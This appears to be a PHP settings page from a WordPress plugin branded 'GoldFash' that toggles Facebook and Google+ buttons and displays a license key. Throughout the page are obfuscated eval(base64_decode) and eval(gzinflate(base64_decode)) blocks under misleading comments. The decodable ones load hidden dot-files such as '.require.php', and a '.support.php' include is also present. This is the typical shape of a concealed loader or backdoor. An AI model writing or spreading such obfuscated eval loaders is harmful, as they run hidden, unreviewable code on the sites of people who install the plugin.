<?php
// Cleans & Clears 
eval(gzinflate(base64_decode('JY1BCgMhDEX3gncI0sWUTs3sSw9jbYSAjaIpzvE7Tpef93jfIJZKAokzgRYYjZWsuaQKT0gTLc57HPUe3h8W9JkjSSevu7oV3Li568MaRIiZQoNYREl0pjZ4sXZrkravxKC0HNUVtr8fc+l03h7GOSae7Ac=')));
// Allows System To Start if Validated in GoldFash Servers. 
// Last Updated 11.26.14
?>


<?php
// Gets .require 
$_F=__FILE__;$_X='Pz48P3BocA0KcjVxMzRyNSgnLnI1cTM0cjUucGhwJyk7DQo/Pg==';
eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
// Last Updated 11.26.14
?>
<?php
    global $fb_opt_name,$gp_opt_name;
if(isset($_POST["submit"])){ 
    $fb_show = $_POST[$fb_opt_name];
    update_option($fb_opt_name, $fb_show);
    $gplus_show = $_POST[$gp_opt_name];
    update_option($gp_opt_name, $gplus_show);
    
    echo '<div id="message" class="updated fade"><p>Options Updated</p></div>';
}
else{
    $fb_show = get_option($fb_opt_name);
    $gplus_show = get_option($gp_opt_name);
}
?>
<?php
// Gets .o.0
$_F=__FILE__;$_X='Pz48P3BocA0KcjVxMzRyNSgnZ2xiX2Mybi8uMi4wLnBocCcpOw0KPz4=';
eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
// Last Updated 11.26.14
?>

    <link rel="shortcut icon" href="https://s3-ap-southeast-2.amazonaws.com/goldfash/GOLD-FASH-150x150.png" type="image/vnd.microsoft.icon" />
<div class="inside">
    <fieldset>
            <legend>General Settings</legend><br />
            
            <?php
            // Gets .00.0.
            eval(gzinflate(base64_decode('4+UqSi0szSxK1VBPz0mKT87P09czMNAz0CvIKFDXtFYAAA==')));
            // Last Updated 11.26.14
            ?>
        <form method="post" action=""> 
            <input type="checkbox" name="<?php echo $fb_opt_name; ?>" <?php echo $fb_show?"checked='checked'":""; ?> /> &nbsp; <span> Show Facebook Like Button </span>
            <br /><br />
            <input type="checkbox" name="<?php echo $gp_opt_name; ?>" <?php echo $gplus_show?"checked='checked'":""; ?> /> &nbsp; <span> Show Google+ Button </span>
            <p><input type="submit" value="Save" class="button button-primary" name="submit" /></p>
        </form>
       
</center></td></fieldset>
            <td valign="top" width="50%" style="border-left: 1px solid #999;">
         <center>   <fieldset>
        <legend>Terms & Disclosures</legend>
        <center>Please be sure to stay uptodate with our terms that affect your website</center><?php
echo $supcop;
?><?php
echo $goldterm;
?><center><font color="red">*</font> Your GoldFash License Key is <font color="red"><strong><?php
print_r($goldSecurity); ?></font></strong> and your GoldFash Secret Code is <font color="gold"><strong><?php
print_r($hashAuth); ?></font></strong> for support visit <a href="http://licensesupport.goldfash.com" target="_blank">GoldFash License Support Team</a> <font color="red">*</font></center>
           </center> </fieldset> <?php $url = content_url(); ?>
<?php include(".support.php"); ?>
<link rel="stylesheet" type="text/css" href="<?php echo $url; ?>//<?php echo $gstyld; ?>"  /><br />
    </fieldset>

            </td>
        </tr>
        <tr>
    
        <?php
        // Gets .0.o.
        eval(gzinflate(base64_decode('4ypKLSzNLErVUE/PSYpPzs/T1zPQy9cryChQ17Tm5QIA')));
        // Last Updated 11.26.14
        ?> </td>
        </tr>
    </table>
    
    </div>
<?php screen_icon(); ?>

	<script type="text/javascript">
        jQuery.ajax({
            url: "<?php bloginfo('wpurl'); ?>?cryptx=news",
            success: function(data) {
                jQuery("#cryptx-news-content").html(data).fadeIn();
            },
            error: function() {
                jQuery("#cryptx-news-content").html('An error ocured while loading News.').fadeIn();
            }
        });
    </script>
	<br /><!-- GoldFash Hosting Trac.0 Metrics --!>
